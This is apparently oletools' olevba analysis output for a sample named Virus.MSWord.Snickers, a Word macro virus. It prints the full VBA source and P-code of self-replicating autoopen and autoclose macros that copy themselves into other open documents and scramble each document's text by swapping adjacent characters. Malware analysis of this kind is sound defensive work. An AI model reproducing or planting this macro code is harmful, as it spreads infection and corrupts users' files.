olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Snickers
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Snickers - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoopen.bas 
in file: Virus.MSWord.Snickers - OLE stream: 'Macros/VBA/autoopen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim a$
Dim a_
Dim b$
WordBasic.ScreenUpdating
WordBasic.DisableAutoMacros
a$ = WordBasic.[FileName$]()
For a_ = 1 To WordBasic.CountFiles()
If WordBasic.[Files$](WordBasic.[FileName$](a_)) <> "" Then
WordBasic.FileList a_
b$ = WordBasic.[FileName$]()
If a$ <> b$ Then
If WordBasic.[GetDocumentVar$]("snickers") = "" Then
WordBasic.MacroCopy a$ + ":autoopen", b$ + ":"
WordBasic.MacroCopy a$ + ":autoclose", b$ + ":"
crypt
WordBasic.SetDocumentVar "snickers", "mmmhh"
WordBasic.FileSaveAs Format:=1
End If
WordBasic.FileClose
End If
End If
Next
crypt
WordBasic.DisableAutoMacros 0
End Sub
Private Sub crypt()
Dim a$
Dim a_
Dim b$
WordBasic.EditSelectAll
a$ = WordBasic.[Selection$]()
On Error Resume Next
For a_ = 1 To Len(a$) Step 2
b$ = b$ + Mid(a$, a_ + 1, 1)
b$ = b$ + Mid(a$, a_, 1)
Next
WordBasic.Insert b$
WordBasic.WW6_EditClear -1
WordBasic.StartOfDocument
End Sub
-------------------------------------------------------------------------------
VBA MACRO autoclose.bas 
in file: Virus.MSWord.Snickers - OLE stream: 'Macros/VBA/autoclose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.ScreenUpdating
WordBasic.Call "autoopen.crypt"
WordBasic.FileSave
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Snickers
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/autoopen - 2638 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn a
' Line #3:
' 	Dim 
' 	VarDefn a_
' Line #4:
' 	Dim 
' 	VarDefn B
' Line #5:
' 	Ld WordBasic 
' 	ArgsMemCall ScreenUpdating 0x0000 
' Line #6:
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #7:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St a$ 
' Line #8:
' 	StartForVariable 
' 	Ld a_ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountFiles 0x0000 
' 	For 
' Line #9:
' 	Ld a_ 
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [Files$] 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #10:
' 	Ld a_ 
' 	Ld WordBasic 
' 	ArgsMemCall FileList 0x0001 
' Line #11:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St B$ 
' Line #12:
' 	Ld a$ 
' 	Ld B$ 
' 	Ne 
' 	IfBlock 
' Line #13:
' 	LitStr 0x0008 "snickers"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #14:
' 	Ld a$ 
' 	LitStr 0x0009 ":autoopen"
' 	Add 
' 	Ld B$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #15:
' 	Ld a$ 
' 	LitStr 0x000A ":autoclose"
' 	Add 
' 	Ld B$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #16:
' 	ArgsCall crypt 0x0000 
' Line #17:
' 	LitStr 0x0008 "snickers"
' 	LitStr 0x0005 "mmmhh"
' 	Ld WordBasic 
' 	ArgsMemCall SetDocumentVar 0x0002 
' Line #18:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0000 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	StartForVariable 
' 	Next 
' Line #24:
' 	ArgsCall crypt 0x0000 
' Line #25:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #26:
' 	EndSub 
' Line #27:
' 	FuncDefn (Private Sub crypt())
' Line #28:
' 	Dim 
' 	VarDefn a
' Line #29:
' 	Dim 
' 	VarDefn a_
' Line #30:
' 	Dim 
' 	VarDefn B
' Line #31:
' 	Ld WordBasic 
' 	ArgsMemCall EditSelectAll 0x0000 
' Line #32:
' 	Ld WordBasic 
' 	ArgsMemLd [Selection$] 0x0000 
' 	St a$ 
' Line #33:
' 	OnError (Resume Next) 
' Line #34:
' 	StartForVariable 
' 	Ld a_ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a$ 
' 	FnLen 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #35:
' 	Ld B$ 
' 	Ld a$ 
' 	Ld a_ 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St B$ 
' Line #36:
' 	Ld B$ 
' 	Ld a$ 
' 	Ld a_ 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St B$ 
' Line #37:
' 	StartForVariable 
' 	Next 
' Line #38:
' 	Ld B$ 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #39:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld WordBasic 
' 	ArgsMemCall WW6_EditClear 0x0001 
' Line #40:
' 	Ld WordBasic 
' 	ArgsMemCall StartOfDocument 0x0000 
' Line #41:
' 	EndSub 
' Macros/VBA/autoclose - 982 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Ld WordBasic 
' 	ArgsMemCall ScreenUpdating 0x0000 
' Line #3:
' 	LitStr 0x000E "autoopen.crypt"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #4:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #5:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

